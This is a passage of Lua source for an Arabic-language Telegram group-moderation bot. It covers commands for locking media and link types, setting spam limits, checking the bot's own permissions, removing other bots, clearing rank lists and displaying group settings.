if text and text:match("^قفل التفليش$") or text and text:match("^تفعيل الحمايه القصوى$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمنشئين فقط', 1, 'md')
else
DevHmD:set(DevTwix.."HmD:Lock:Bots"..msg.chat_id_,"del") DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'HmD:Lock:Links','HmD:Lock:Contact','HmD:Lock:Forwards','HmD:Lock:Videos','HmD:Lock:Gifs','HmD:Lock:EditMsgs','HmD:Lock:Stickers','HmD:Lock:Farsi','HmD:Lock:Spam','HmD:Lock:WebLinks','HmD:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevHmD:set(DevTwix..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التفليش")  
end
end
if text and text:match("^فتح التفليش$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمنشئين فقط', 1, 'md')
else
DevHmD:hdel(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'HmD:Lock:Links','HmD:Lock:Contact','HmD:Lock:Forwards','HmD:Lock:Videos','HmD:Lock:Gifs','HmD:Lock:EditMsgs','HmD:Lock:Stickers','HmD:Lock:Farsi','HmD:Lock:Spam','HmD:Lock:WebLinks','HmD:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
DevHmD:del(DevTwix..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح التفليش")  
end
end
---------------------------------------------------------------------------------------
if text and text:match("^قفل الكل$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمنشئين فقط', 1, 'md')
else
DevHmD:del(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_) DevHmD:del(DevTwix..'HmD:Lock:Taf'..msg.chat_id_) DevHmD:del(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_) 
DevHmD:set(DevTwix.."HmD:Lock:Bots"..msg.chat_id_,"del") DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'HmD:Lock:EditMsgs','HmD:Lock:Farsi','HmD:Lock:TagServr','HmD:Lock:Inline','HmD:Lock:Photo','HmD:Lock:Spam','HmD:Lock:Videos','HmD:Lock:Gifs','HmD:Lock:Music','HmD:Lock:Voice','HmD:Lock:Links','HmD:Lock:Location','HmD:Lock:Tags','HmD:Lock:Stickers','HmD:Lock:Markdown','HmD:Lock:Forwards','HmD:Lock:Document','HmD:Lock:Contact','HmD:Lock:Hashtak','HmD:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevHmD:set(DevTwix..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل جميع الاوامر")  
end
end
if text and text:match("^فتح الكل$") and ChCheck(msg) then
if not Constructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمنشئين فقط', 1, 'md')
else
DevHmD:set(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_,true) DevHmD:set(DevTwix..'HmD:Lock:Taf'..msg.chat_id_,true) DevHmD:set(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_,true) DevHmD:hdel(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'HmD:Lock:EditMsgs','HmD:Lock:Text','HmD:Lock:Arabic','HmD:Lock:English','HmD:Lock:Join','HmD:Lock:Bots','HmD:Lock:Farsi','HmD:Lock:FarsiBan','HmD:Lock:TagServr','HmD:Lock:Inline','HmD:Lock:Photo','HmD:Lock:Spam','HmD:Lock:Videos','HmD:Lock:Gifs','HmD:Lock:Music','HmD:Lock:Voice','HmD:Lock:Links','HmD:Lock:Location','HmD:Lock:Tags','HmD:Lock:Stickers','HmD:Lock:Markdown','HmD:Lock:Forwards','HmD:Lock:Document','HmD:Lock:Contact','HmD:Lock:Hashtak','HmD:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
DevHmD:del(DevTwix..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم فتح جميع الاوامر")  
end
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevHmD:set(DevTwix..'HmD:Spam:Text'..msg.chat_id_,SetSpam)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم وضع عدد السبام »'..SetSpam, 1, 'md')
end
end
end
---------------------------------------------------------------------------------------
if Manager(msg) then
if text == "فحص" and ChCheck(msg) or text == "فحص البوت" and ChCheck(msg) then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..DevTwix)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙صلاحيات البوت هي » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙حذف الرسائل » '..DEL..'\n⋄︙دعوة المستخدمين » '..INV..'\n⋄︙حظر المستخدمين » '..BAN..'\n⋄︙تثبيت الرسائل » '..PIN..'\n⋄︙تغيير المعلومات » '..EDT..'\n⋄︙اضافة مشرفين » '..VIP..'\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المطور (.*)$") 
DevHmD:set(DevTwix.."HmD:SudoBot:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد المطور الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevHmD:set(DevTwix.."HmD:HMDicConstructor:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد المنشئ الاساسي الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevHmD:set(DevTwix.."HmD:Constructor:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد المنشئ الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المدير (.*)$") 
DevHmD:set(DevTwix.."HmD:Managers:Rd"..msg.chat_id_,Text) 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد المدير الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevHmD:set(DevTwix.."HmD:Admins:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد الادمن الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المميز (.*)$") 
DevHmD:set(DevTwix.."HmD:VipMem:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد المميز الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevHmD:set(DevTwix.."HmD:Cleaner:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد المنظف الى » "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") and ChCheck(msg) then
local Text = text:match("^تغير رد العضو (.*)$") 
DevHmD:set(DevTwix.."HmD:mem:Rd"..msg.chat_id_,Text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم تغير رد العضو الى » "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف جميع ردود الرتب", 1, 'md')
DevHmD:del(DevTwix.."HmD:mem:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:Cleaner:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:VipMem:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:Admins:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:Managers:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:Constructor:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:HMDicConstructor:Rd"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:SudoBot:Rd"..msg.chat_id_)
end
end
---------------------------------------------------------------------------------------
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '⋄︙*قائمة البوتات* »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙*عدد البوتات هنا* » '..n..'\n'
local f = '⋄︙*عدد البوتات المرفوعه* » '..t..'\n⋄︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_HmD(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(DevTwix) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙*عدد البوتات هنا* » "..c.."\n⋄︙*عدد البوتات المرفوعه* » "..x.."\n⋄︙*تم طرد* » "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
---------------------------------------------------------------------------------------
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then
if txts[2] == 'الاساسيين' or txtss[2] == 'الاساسيين' or txts[2] == 'المطورين الاساسيين' or txtss[2] == 'المطورين الاساسيين' then
DevHmD:del(DevTwix..'HmD:HmDSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المطورين الاساسيين")  
end
end
if HmDSudo(msg) then
if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
DevHmD:del(DevTwix..'HmD:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المطورين الثانويين")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevHmD:del(DevTwix..'HmD:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevHmD:del(DevTwix..'HmD:BanAll:')
DevHmD:del(DevTwix..'HmD:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المالكين")  
DevHmD:del(DevTwix..'HmD:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المنشئين الاساسيين")  
DevHmD:del(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_)
end
end
if HMDicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المنشئين")  
DevHmD:del(DevTwix..'HmD:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المدراء")  
DevHmD:del(DevTwix..'HmD:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المنظفين")  
DevHmD:del(DevTwix..'HmD:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف الادمنيه")  
DevHmD:del(DevTwix..'HmD:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف القوانين")  
DevHmD:del(DevTwix..'HmD:rules'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المطايه")  
DevHmD:del(DevTwix..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف رابط المجموعه")  
DevHmD:del(DevTwix.."HmD:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المميزين")  
DevHmD:del(DevTwix..'HmD:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevHmD:del(DevTwix..'HmD:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المكتومين")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local List = DevHmD:smembers(DevTwix..'HmD:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevHmD:srem(DevTwix..'HmD:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف المقيدين")  
end
if HmDConstructor(msg) then
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف قائمة المنع")  
DevHmD:del(DevTwix..'HmD:Filters:'..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Filters:'..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:FilterAnimation"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:FilterPhoto"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف قوائم المنع")  
DevHmD:del(DevTwix..'HmD:Filters:'..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:FilterAnimation"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:FilterPhoto"..msg.chat_id_)
DevHmD:del(DevTwix.."HmD:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevHmD:del(DevTwix.."HmD:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف قائمة منع المتحركات")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevHmD:del(DevTwix.."HmD:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف قائمة منع الصور")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevHmD:del(DevTwix.."HmD:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف قائمة منع الملصقات")  
end
end
end
end
---------------------------------------------------------------------------------------
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not HMDicConstructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمنشئ الاساسي فقط', 1, 'md')
else
DevHmD:del(DevTwix..'HmD:Ban:'..msg.chat_id_) DevHmD:del(DevTwix..'HmD:Admins:'..msg.chat_id_) DevHmD:del(DevTwix..'User:Donky:'..msg.chat_id_) DevHmD:del(DevTwix..'HmD:VipMem:'..msg.chat_id_) DevHmD:del(DevTwix..'HmD:Filters:'..msg.chat_id_) DevHmD:del(DevTwix..'HmD:Muted:'..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف » ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
---------------------------------------------------------------------------------------
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not HmDConstructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمالكين فقط', 1, 'md')
else
local HMDicconstructor = DevHmD:smembers(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_)
local constructor = DevHmD:smembers(DevTwix..'HmD:Constructor:'..msg.chat_id_)
local Managers = DevHmD:smembers(DevTwix..'HmD:Managers:'..msg.chat_id_)
local admins = DevHmD:smembers(DevTwix..'HmD:Admins:'..msg.chat_id_)
local vipmem = DevHmD:smembers(DevTwix..'HmD:VipMem:'..msg.chat_id_)
local donky = DevHmD:smembers(DevTwix..'User:Donky:'..msg.chat_id_)
if #HMDicconstructor ~= 0 then HMDicconstructort = 'المنشئين الاساسيين • ' else HMDicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #HMDicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevHmD:del(DevTwix..'HmD:HMDicConstructor:'..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Constructor:'..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Managers:'..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Admins:'..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:VipMem:'..msg.chat_id_)
DevHmD:del(DevTwix..'User:Donky:'..msg.chat_id_)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حذف جميع الرتب التاليه » ❨ "..HMDicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
---------------------------------------------------------------------------------------
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevHmD:get(DevTwix..'HmD:Spam:Text'..msg.chat_id_)
end
---------------------------------------------------------------------------------------
if DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix.."HmD:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevHmD:get(DevTwix.."HmD:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevHmD:get(DevTwix.."HmD:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix..'HmD:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevHmD:get(DevTwix..'HmD:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevHmD:get(DevTwix.."HmD:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevHmD:get(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevHmD:get(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevHmD:get(DevTwix..'HmD:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevHmD:get(DevTwix..'HmD:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
---------------------------------------------------------------------------------------
local TXTE = "⋄︙اعدادات المجموعه » \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
.."⋄︙الروابط » "..mute_links.."\n"
.."⋄︙المعرف » "..lock_tag.."\n"
.."⋄︙البوتات » "..lock_bots.."\n"
.."⋄︙المتحركه » "..mute_gifs.."\n"
.."⋄︙الملصقات » "..lock_sticker.."\n"
.."⋄︙الملفات » "..lock_file.."\n"
.."⋄︙الصور » "..mute_photo.."\n"
.."⋄︙الفيديو » "..mute_video.."\n"
.."⋄︙الاونلاين » "..mute_in.."\n"
.."⋄︙الدردشه » "..mute_text.."\n"
.."⋄︙التوجيه » "..lock_forward.."\n"
.."⋄︙الاغاني » "..mute_music.."\n"
.."⋄︙الصوت » "..mute_voice.."\n"
.."⋄︙الجهات » "..lock_contact.."\n"
.."⋄︙الماركداون » "..markdown.."\n"
.."⋄︙الهاشتاك » "..lock_htag.."\n"
.."⋄︙التعديل » "..mute_edit.."\n"
.."⋄︙التثبيت » "..lock_pin.."\n"
.."⋄︙الاشعارات » "..lock_tgservice.."\n"
.."⋄︙الكلايش » "..lock_spam.."\n"
.."⋄︙الدخول » "..lock_Join.."\n"
.."⋄︙الشبكات » "..lock_wp.."\n"
.."⋄︙المواقع » "..lock_location.."\n"
.."⋄︙الفشار » "..lock_fshar.."\n"
.."⋄︙الكفر » "..lock_kaf.."\n"
.."⋄︙الطائفيه » "..lock_taf.."\n"
.."⋄︙العربيه » "..lock_arabic.."\n"
.."⋄︙الانكليزيه » "..lock_english.."\n"
.."⋄︙الفارسيه » "..lock_farsi.."\n"
.."⋄︙التكرار » "..flood.."\n"
.."⋄︙عدد التكرار » "..Flood_Num.."\n"
.."⋄︙عدد السبام » "..spam_c.."\n"
.."•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙Source » @DevTwix .\n"
Dev_HmD(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
---------------------------------------------------------------------------------------
if text == "تفعيل كول" and Manager(msg) and ChTwixDev(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل امر كول بنجاح",'md')
